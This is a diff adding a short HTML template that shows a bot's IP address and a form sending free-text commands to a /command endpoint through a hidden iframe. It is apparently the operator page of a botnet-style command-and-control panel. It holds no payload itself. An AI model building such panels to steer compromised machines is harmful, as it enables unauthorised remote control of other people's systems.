@@ -1,0 +1,15 @@
+{% extends 'base.html' %}
+
+{% block body %}
+
+<br><br>
+
+{{ bot_data['ip'] }}
+
+<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+<form action="/command" method="POST", target="dummyframe">
+    <input name="command">
+    <input type="submit">
+</form>
+
+{% endblock %}
